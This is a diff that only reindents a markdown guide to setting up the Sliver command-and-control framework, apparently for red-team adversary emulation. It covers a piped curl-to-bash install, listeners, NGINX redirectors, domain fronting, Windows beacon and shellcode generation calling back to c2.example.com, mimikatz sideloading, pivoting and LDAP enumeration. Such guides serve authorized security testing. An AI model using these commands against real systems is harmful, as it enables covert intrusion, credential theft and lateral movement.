@@ -79,103 +79,103 @@ Sliver is an open-source, cross-platform adversary emulation framework developed
 1. Provision a VPS (e.g., DigitalOcean, Linode, AWS EC2) for the team server
 2. Harden the OS: disable SSH password auth, configure UFW/iptables, install fail2ban
 3. Install Sliver using the official install script:
-   ```bash
-   curl https://sliver.sh/install | sudo bash
-   ```
+ ```bash
+ curl https://sliver.sh/install | sudo bash
+ ```
 4. Start the Sliver server daemon:
-   ```bash
-   systemctl start sliver
-   # Or run interactively
-   sliver-server
-   ```
+ ```bash
+ systemctl start sliver
+ # Or run interactively
+ sliver-server
+ ```
 5. Generate operator configuration files for team members:
-   ```bash
-   new-operator --name operator1 --lhost <team-server-ip>
-   ```
+ ```bash
+ new-operator --name operator1 --lhost <team-server-ip>
+ ```
 
 ### Phase 2: Listener Configuration
 1. Configure an HTTPS listener with a legitimate SSL certificate:
-   ```bash
-   https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --cert /path/to/cert.pem --key /path/to/key.pem
-   ```
+ ```bash
+ https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --cert /path/to/cert.pem --key /path/to/key.pem
+ ```
 2. Configure a DNS listener for fallback C2:
-   ```bash
-   dns --domains c2dns.example.com --lport 53
-   ```
+ ```bash
+ dns --domains c2dns.example.com --lport 53
+ ```
 3. Configure mTLS listener for high-security sessions:
-   ```bash
-   mtls --lhost 0.0.0.0 --lport 8888
-   ```
+ ```bash
+ mtls --lhost 0.0.0.0 --lport 8888
+ ```
 4. Configure WireGuard listener for tunneled access:
-   ```bash
-   wg --lport 51820
-   ```
+ ```bash
+ wg --lport 51820
+ ```
 
 ### Phase 3: Redirector Setup
 1. Deploy a separate VPS as a redirector (positioned between targets and team server)
 2. Install and configure NGINX as a reverse proxy:
-   ```nginx
-   server {
-       listen 443 ssl;
-       server_name c2.example.com;
-       ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
-       ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
+ ```nginx
+ server {
+ listen 443 ssl;
+ server_name c2.example.com;
+ ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
+ ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
 
-       location / {
-           proxy_pass https://<team-server-ip>:443;
-           proxy_ssl_verify off;
-           proxy_set_header Host $host;
-           proxy_set_header X-Real-IP $remote_addr;
-       }
-   }
-   ```
+ location / {
+ proxy_pass https://<team-server-ip>:443;
+ proxy_ssl_verify off;
+ proxy_set_header Host $host;
+ proxy_set_header X-Real-IP $remote_addr;
+ }
+ }
+ ```
 3. Configure iptables rules on the team server to only accept connections from the redirector:
-   ```bash
-   iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
-   iptables -A INPUT -p tcp --dport 443 -j DROP
-   ```
+ ```bash
+ iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
+ iptables -A INPUT -p tcp --dport 443 -j DROP
+ ```
 4. Optionally set up Cloudflare as a CDN layer in front of the redirector for domain fronting
 
 ### Phase 4: Implant Generation
 1. Generate an HTTPS beacon implant:
-   ```bash
-   generate beacon --http https://c2.example.com --os windows --arch amd64 --format exe --name payload
-   ```
+ ```bash
+ generate beacon --http https://c2.example.com --os windows --arch amd64 --format exe --name payload
+ ```
 2. Generate a DNS beacon for restricted networks:
-   ```bash
-   generate beacon --dns c2dns.example.com --os windows --arch amd64
-   ```
+ ```bash
+ generate beacon --dns c2dns.example.com --os windows --arch amd64
+ ```
 3. Generate a shellcode payload for injection:
-   ```bash
-   generate --http https://c2.example.com --os windows --arch amd64 --format shellcode
-   ```
+ ```bash
+ generate --http https://c2.example.com --os windows --arch amd64 --format shellcode
+ ```
 4. Configure beacon jitter and callback intervals:
-   ```bash
-   generate beacon --http https://c2.example.com --seconds 60 --jitter 30
-   ```
+ ```bash
+ generate beacon --http https://c2.example.com --seconds 60 --jitter 30
+ ```
 
 ### Phase 5: Post-Exploitation Operations
 1. Interact with active beacons/sessions:
-   ```bash
-   beacons        # List active beacons
-   use <beacon-id> # Interact with a beacon
-   ```
+ ```bash
+ beacons # List active beacons
+ use <beacon-id> # Interact with a beacon
+ ```
 2. Execute post-exploitation modules:
-   ```bash
-   ps              # Process listing
-   netstat         # Network connections
-   execute-assembly /path/to/Seatbelt.exe -group=all  # Run .NET assemblies
-   sideload /path/to/mimikatz.dll  # Load DLLs
-   ```
+ ```bash
+ ps # Process listing
+ netstat # Network connections
+ execute-assembly /path/to/Seatbelt.exe -group=all # Run .NET assemblies
+ sideload /path/to/mimikatz.dll # Load DLLs
+ ```
 3. Set up pivots for internal network access:
-   ```bash
-   pivots tcp --bind 0.0.0.0:9898  # Create pivot listener on compromised host
-   ```
+ ```bash
+ pivots tcp --bind 0.0.0.0:9898 # Create pivot listener on compromised host
+ ```
 4. Use BOF (Beacon Object Files) for in-memory execution:
-   ```bash
-   armory install sa-ldapsearch  # Install from armory
-   sa-ldapsearch -- "(objectClass=user)"  # Execute BOF
-   ```
+ ```bash
+ armory install sa-ldapsearch # Install from armory
+ sa-ldapsearch -- "(objectClass=user)" # Execute BOF
+ ```
 
 ## Tools and Resources
 
